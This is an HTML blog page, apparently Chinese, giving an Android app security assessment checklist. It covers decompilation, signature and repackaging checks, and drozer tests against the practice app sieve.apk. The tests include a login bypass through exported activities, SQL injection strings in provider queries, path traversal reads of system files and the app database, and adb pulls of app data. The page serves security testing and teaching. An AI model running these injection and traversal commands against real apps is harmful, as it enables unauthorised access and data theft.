@@ -1,0 +1,354 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+    <meta charset="utf-8" />
+    <title>Android安全评估 | W000i</title>
+    <meta name="author" content="W00i" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <link rel="icon" href="/images/avatar.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.googleapis.cn" />
+<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
+<link
+    rel="stylesheet"
+    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
+/>
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>W000I</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;主页</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;W000I</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">主页</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>Android安全评估</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/8/19
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/%E6%B8%97%E9%80%8F/" style="color: #00bcd4">
+                    渗透
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <p>Android安全评估指南</p>
+<span id="more"></span>
+
+<h2 id="反编译保护"><a href="#反编译保护" class="headerlink" title="反编译保护"></a>反编译保护</h2><p>.apk后缀改为.zip解压获取到dex文件(有可能单个dex也有可能多个)</p>
+<p><img src="/../imgs/Android%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/image-20240820152758750.png" alt="image-20240820152758750"></p>
+<p>使用dex2jar转换为jar</p>
+<p>为了方便测试.dex文件拷贝到dex2jar项目目录下</p>
+<p><img src="/../imgs/Android%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/wps46.jpg" alt="img"> </p>
+<p>执行以下命令，吧dex全部转换为.jar</p>
+<p>d2j-dex2jar.bat classes.dex</p>
+<p><img src="/../imgs/Android%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/wps47.jpg" alt="img"> </p>
+<p>还原的jar文件都在当前目录下</p>
+<p>打开jadx，全选还原的jar文件拖到jadx里面 </p>
+<p><img src="/../imgs/Android%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/wps48.jpg" alt="img"> </p>
+<p>逆向后发现是没混淆的情况，是不安全的。</p>
+<p>如果代码经过混淆，或者有加壳措施，不能完整恢复源代码的，都可以认为此项安全</p>
+<h2 id="安装包签名"><a href="#安装包签名" class="headerlink" title="安装包签名"></a>安装包签名</h2><p>使用jdk自带的jarsigner.exe检查安装包的签名，命令如下</p>
+<p>jarsigner.exe -verify APK文件名 -verbose -certs</p>
+<p><img src="/../imgs/Android%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/wps49.jpg" alt="img"> </p>
+<p>上图，说明测试结果为安全。</p>
+<p>当输出结果为“jar 已验证”时，表示签名正常。</p>
+<p>CN 及其他字段是否正确标识客户端程序的来源和发布者身份。</p>
+<p>下图，说明测试结果存在风险</p>
+<p><img src="/../imgs/Android%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/wps50.jpg" alt="img"> </p>
+<p>Debug 证书、第三方（如 开发方）证书等等均认为风险。</p>
+<h2 id="签名完整性"><a href="#签名完整性" class="headerlink" title="签名完整性"></a>签名完整性</h2><p>测试目标APP重签名是否可以正常运行。</p>
+<h2 id="应用完整性"><a href="#应用完整性" class="headerlink" title="应用完整性"></a>应用完整性</h2><p>Apk默认界面</p>
+<p><img src="/../imgs/Android%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/wps51.jpg" alt="img"> </p>
+<p>用ApkTool工具将目标 APK 文件解包，命令如下；</p>
+<p>java -jar apktool.jar d -f APK路径 -o 输出路径</p>
+<p><img src="/../imgs/Android%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/wps52.jpg" alt="img"> </p>
+<p><img src="/../imgs/Android%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/wps53.jpg" alt="img"> </p>
+<p>修改文件资源，尽量找标志比较明显的图标，容易确认打包后是否修改成功。</p>
+<p>使用以下命令打包apk</p>
+<p>java -jar apktool.jar b -f 打包文件目录 -o 生成的apk文件.apk</p>
+<p>签名安装后app背景换成了替换的图片</p>
+<p><img src="/../imgs/Android%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/wps54.jpg" alt="img"> </p>
+<h2 id="APP数据任意备份"><a href="#APP数据任意备份" class="headerlink" title="APP数据任意备份"></a>APP数据任意备份</h2><p>使用反编译工具反编译客户端程序，并检查AndroidManifest.xml文件中的<application>节点android:allowBackup的属性值，android:allowBackup属性默认为false。</p>
+<p><img src="/../imgs/Android%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/wps55.jpg" alt="img"></p>
+<h2 id="APP可调试"><a href="#APP可调试" class="headerlink" title="APP可调试"></a>APP可调试</h2><p>使用反编译工具反编译客户端程序，并检查AndroidManifest.xml文件中的<application>节点的属性值。</p>
+<p>经测试发现，未找到android:debuggable</p>
+<p>如果在AndroidManifest.xml中没有显式声明android:debuggable属性，那么默认情况下，这个属性的值是false。这意味着应用在发布模式下运行，而不是调试模式。</p>
+<p><img src="/../imgs/Android%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/wps56.jpg" alt="img"> </p>
+<h2 id="敏感资源文件"><a href="#敏感资源文件" class="headerlink" title="敏感资源文件"></a>敏感资源文件</h2><p>解压目标程序，查看解压出的相关资源文件，通过Visual Studio Code搜索敏感字段，未发现存在明文敏感信息资源文件。</p>
+<h2 id="Activity越权"><a href="#Activity越权" class="headerlink" title="Activity越权"></a>Activity越权</h2><p>Activity 组件默认是不导出的，如果 AndroidManifest.xml 中设置了 exported &#x3D; “true”</p>
+<p>测试样本 sieve.apk：<a target="_blank" rel="noopener" href="https://github.com/as0ler/Android-Examples">https://github.com/as0ler/Android-Examples</a></p>
+<p>手机打开drozer</p>
+<p><img src="/../imgs/Android%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/wps57.jpg" alt="img"> </p>
+<p>adb forward tcp:31415 tcp:31415</p>
+<p>drozer console connect</p>
+<p><img src="/../imgs/Android%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/wps58.jpg" alt="img"> </p>
+<p>列出程序中所有的APP 包，但是没看到刚才安装的app</p>
+<p>run app.package.list</p>
+<p><img src="/../imgs/Android%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/wps59.jpg" alt="img"> </p>
+<p>使用应用信息查看器得到包名</p>
+<p><img src="/../imgs/Android%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/wps60.jpg" alt="img"> </p>
+<p>识别攻击面，有3个activity是可以被导出的</p>
+<p>run app.package.attacksurface 包名</p>
+<p>查询暴露activity的信息</p>
+<p>run app.activity.info -a 包名</p>
+<p><img src="/../imgs/Android%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/wps61.jpg" alt="img"> </p>
+<p>打开app是需要填写账号密码</p>
+<p><img src="/../imgs/Android%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/wps62.jpg" alt="img"> </p>
+<p>调用组件绕过登录页面</p>
+<p>run app.activity.start –component 包名 服务名</p>
+<p><img src="/../imgs/Android%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/wps63.jpg" alt="img"> </p>
+<h2 id="Activity拒绝服务"><a href="#Activity拒绝服务" class="headerlink" title="Activity拒绝服务"></a>Activity拒绝服务</h2><p>查看攻击面</p>
+<p>run app.activity.info -a 包名</p>
+<p><img src="/../imgs/Android%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/wps64.jpg" alt="img"> </p>
+<p>调用组件</p>
+<p> run app.activity.start –component 包名 服务名</p>
+<p><img src="/../imgs/Android%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/wps65.jpg" alt="img"></p>
+<h2 id="Activity劫持保护"><a href="#Activity劫持保护" class="headerlink" title="Activity劫持保护"></a>Activity劫持保护</h2><p>劫持app：<a target="_blank" rel="noopener" href="https://github.com/aloswoya/android_app">https://github.com/aloswoya/android_app</a></p>
+<p>被劫持app：drozer</p>
+<p>使用drozer来调用MainActivity。</p>
+<p>run app.activity.start –component com.test.uihijack com.test.uihijack.MainActivity</p>
+<p><img src="/../imgs/Android%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/wps66.jpg" alt="img"></p>
+<h2 id="Service越权"><a href="#Service越权" class="headerlink" title="Service越权"></a>Service越权</h2><p>使用Drozer框架进行检测</p>
+<p>识别攻击面，有2个services是可以被导出的</p>
+<p>run app.package.attacksurface 包名</p>
+<p><img src="/../imgs/Android%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/wps67.jpg" alt="img"> </p>
+<p>查询暴露services的信息</p>
+<p>run app.service.info -a 包名</p>
+<p><img src="/../imgs/Android%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/wps68.jpg" alt="img"> </p>
+<p>调用组件</p>
+<p>run app.service.start –component 包名 服务名</p>
+<p><img src="/../imgs/Android%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/wps69.jpg" alt="img"> </p>
+<p>App未跳转到密码界面。</p>
+<h2 id="Service拒绝服务"><a href="#Service拒绝服务" class="headerlink" title="Service拒绝服务"></a>Service拒绝服务</h2><p>使用Drozer框架进行检测</p>
+<p>识别攻击面，有2个services是可以被导出的</p>
+<p>run app.package.attacksurface 包名</p>
+<p><img src="/../imgs/Android%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/wps70.jpg" alt="img"> </p>
+<p>查询暴露services的信息</p>
+<p>run app.service.info -a 包名</p>
+<p><img src="/../imgs/Android%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/wps71.jpg" alt="img"> </p>
+<p>调用组件</p>
+<p>run app.service.start –component 包名 服务名</p>
+<p><img src="/../imgs/Android%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/wps72.jpg" alt="img"> </p>
+<p>App未异常退出。</p>
+<h2 id="Receiver越权"><a href="#Receiver越权" class="headerlink" title="Receiver越权"></a>Receiver越权</h2><p>使用Drozer框架进行检测，得到该客户端不存在漏洞的Receiver组件。</p>
+<h2 id="Receiver拒绝服务"><a href="#Receiver拒绝服务" class="headerlink" title="Receiver拒绝服务"></a>Receiver拒绝服务</h2><p>使用Drozer框架进行检测</p>
+<p>识别攻击面，有0个Receiver是可以被导出的。</p>
+<h2 id="Provider-SQL注入"><a href="#Provider-SQL注入" class="headerlink" title="Provider SQL注入"></a>Provider SQL注入</h2><p>使用drozer扫描注入的位置</p>
+<p>run scanner.provider.injection -a  com.mwr.example.sieve</p>
+<p><img src="/../imgs/Android%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/wps73.jpg" alt="img"> </p>
+<p>如果存在漏洞，执行以下命令，如果返回了报错信息，接着构造sql获取敏感数据</p>
+<p>run app.provider.query content:&#x2F;&#x2F;com.mwr.example.sieve.DBContentProvider&#x2F;Passwords –projection “‘“</p>
+<p>run app.provider.query content:&#x2F;&#x2F;com.mwr.example.sieve.DBContentProvider&#x2F;Passwords –projection “ * from Key;–+”</p>
+<p><img src="/../imgs/Android%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/wps74.jpg" alt="img"> </p>
+<p>列出所有表信息</p>
+<p>run app.provider.query content:&#x2F;&#x2F;com.mwr.example.sieve.DBContentProvider&#x2F;Passwords –projection “* FROM SQLITE_MASTER WHERE type&#x3D;’table’;–”</p>
+<p><img src="/../imgs/Android%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/wps75.jpg" alt="img"></p>
+<h2 id="Provider-目录遍历"><a href="#Provider-目录遍历" class="headerlink" title="Provider 目录遍历"></a>Provider 目录遍历</h2><p>使用drozer扫描漏洞</p>
+<p>run scanner.provider.traversal -a com.mwr.example.sieve</p>
+<p><img src="/../imgs/Android%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/wps76.jpg" alt="img"> </p>
+<p>读取系统文件</p>
+<p>run app.provider.read content:&#x2F;&#x2F;com.mwr.example.sieve.FileBackupProvider&#x2F;etc&#x2F;hosts</p>
+<p><img src="/../imgs/Android%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/wps77.jpg" alt="img">下载系统文件</p>
+<p>run app.provider.download content:&#x2F;&#x2F;com.mwr.example.sieve.FileBackupProvider&#x2F;data&#x2F;data&#x2F;com.mwr.example.sieve&#x2F;databases&#x2F;database.db d:&#x2F;tmp&#x2F;database.db</p>
+<p><img src="/../imgs/Android%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/wps78.jpg" alt="img"> </p>
+<h2 id="Provider-数据泄露"><a href="#Provider-数据泄露" class="headerlink" title="Provider 数据泄露"></a>Provider 数据泄露</h2><p>在sieve添加一条数据，待会儿读取它</p>
+<p><img src="/../imgs/Android%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/wps79.jpg" alt="img">	</p>
+<p>扫描漏洞</p>
+<p>run scanner.provider.finduris -a com.mwr.example.sieve</p>
+<p><img src="/../imgs/Android%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/wps80.jpg" alt="img"> </p>
+<p>尝试读取可访问的url</p>
+<p>run app.provider.query content:&#x2F;&#x2F;com.mwr.example.sieve.DBContentProvider&#x2F;Keys&#x2F;</p>
+<p><img src="/../imgs/Android%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/wps81.jpg" alt="img"> </p>
+<h2 id="WebView代码执行"><a href="#WebView代码执行" class="headerlink" title="WebView代码执行"></a>WebView代码执行</h2><p>查看AndroidManifest.xml文件中<uses-sdk>节点的android:minSdkVersion的属性值，该属性值为19，不存在该漏洞。</p>
+<p><img src="/../imgs/Android%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/wps82.jpg" alt="img"> </p>
+<h2 id="WebView未移除接口"><a href="#WebView未移除接口" class="headerlink" title="WebView未移除接口"></a>WebView未移除接口</h2><p>查看AndroidManifest.xml文件中<uses-sdk>节点的android:minSdkVersion的属性值，该属性值为19，不存在该漏洞。</p>
+<p><img src="/../imgs/Android%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/wps83.jpg" alt="img"></p>
+<h2 id="Root环境"><a href="#Root环境" class="headerlink" title="Root环境"></a>Root环境</h2><p>在root设备打开app是否出现安全提示。</p>
+<h2 id="注入检测"><a href="#注入检测" class="headerlink" title="注入检测"></a>注入检测</h2><p>通过注入工具，向目标应用程序中注入动态链接库，并执行动态链接库中的函数。</p>
+<p>检测发现，目标程序不存在反注入机制。</p>
+<p><img src="/../imgs/Android%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/wps84.jpg" alt="img"> </p>
+<h2 id="模拟器环境"><a href="#模拟器环境" class="headerlink" title="模拟器环境"></a>模拟器环境</h2><p>测试App是否对当前运行环境检测。</p>
+<h2 id="SQLite敏感信息"><a href="#SQLite敏感信息" class="headerlink" title="SQLite敏感信息"></a>SQLite敏感信息</h2><p># 1、创建临时存储文件夹</p>
+<p>adb shell</p>
+<p>mkdir &#x2F;mnt&#x2F;sdcard&#x2F;BackupDBS</p>
+<p>cd &#x2F;data&#x2F;data&#x2F;com.mwr.example.sieve&#x2F;</p>
+<p># 2、压缩并拉取文件</p>
+<p>find . -name “*.db” -type f -exec  cp {} &#x2F;mnt&#x2F;sdcard&#x2F;BackupDBS ;</p>
+<p>tar cvf &#x2F;mnt&#x2F;sdcard&#x2F;BackupDBS&#x2F;backups.tar &#x2F;mnt&#x2F;sdcard&#x2F;BackupDBS&#x2F;</p>
+<p>adb pull &#x2F;mnt&#x2F;sdcard&#x2F;BackupDBS&#x2F;backups.tar D:\xxxx.tar</p>
+<p>使用数据库查看工具查看是否存在敏感信息。</p>
+<h2 id="SharedPref敏感信息"><a href="#SharedPref敏感信息" class="headerlink" title="SharedPref敏感信息"></a>SharedPref敏感信息</h2><p># 1、创建临时存储文件夹</p>
+<p>adb shell</p>
+<p>mkdir &#x2F;mnt&#x2F;sdcard&#x2F;BackupDBS</p>
+<p>cd &#x2F;data&#x2F;data&#x2F;com.mwr.example.sieve&#x2F;</p>
+<p># 2、压缩并拉取文件</p>
+<p>find . -name “*.xml” -type f -exec  cp {} &#x2F;mnt&#x2F;sdcard&#x2F;BackupDBS ;</p>
+<p>tar cvf &#x2F;mnt&#x2F;sdcard&#x2F;BackupDBS&#x2F;backups.tar &#x2F;mnt&#x2F;sdcard&#x2F;BackupDBS&#x2F;</p>
+<p>adb pull &#x2F;mnt&#x2F;sdcard&#x2F;BackupDBS&#x2F;backups.tar D:\xxxx.tar</p>
+<p>查看xml文件是否存在敏感信息。</p>
+<h2 id="Log敏感信息"><a href="#Log敏感信息" class="headerlink" title="Log敏感信息"></a>Log敏感信息</h2><p>使用adb logcat抓取log日志，分析进程日志，查看日志中是包含明文业务信息。</p>
+<h2 id="通信加密"><a href="#通信加密" class="headerlink" title="通信加密"></a>通信加密</h2><p>抓包查看是否使用https</p>
+<h2 id="关键内容加密"><a href="#关键内容加密" class="headerlink" title="关键内容加密"></a>关键内容加密</h2><p>检测发现目标APP对登录字段进行加密处理。</p>
+<p><img src="/../imgs/Android%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/wps85.jpg" alt="img"></p>
+<h2 id="安全退出"><a href="#安全退出" class="headerlink" title="安全退出"></a>安全退出</h2><p>检查客户端在退出时，是否向服务端发送终止会话请求。客户端退出后，还能否使用退出前的会话 id 访问登录后才能访问的页面。</p>
+<h2 id="开放端口"><a href="#开放端口" class="headerlink" title="开放端口"></a>开放端口</h2><p>利用netstat命令或者netstatplus程序，检测未发现应用程序开启全局监听端口。</p>
+<p><img src="/../imgs/Android%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/wps86.jpg" alt="img"></p>
+<h2 id="堆栈保护"><a href="#堆栈保护" class="headerlink" title="堆栈保护"></a>堆栈保护</h2><p>使用检测工具扫描目标APP中的so文件，测试未发现存在无保护so文件</p>
+<p>反编译APP提取so文件</p>
+<p>checksec –file&#x3D;libpangleflipped.so</p>
+<p><img src="/../imgs/Android%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/wps87.jpg" alt="img"> </p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 W000i
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;W00i
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+	
+	
+	{% if theme.fireworks %}
+   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+   <script type="text/javascript" src="/js/lib/fireworks.js"></script>
+    {% endif %}
+ 
+</body>
+</html>
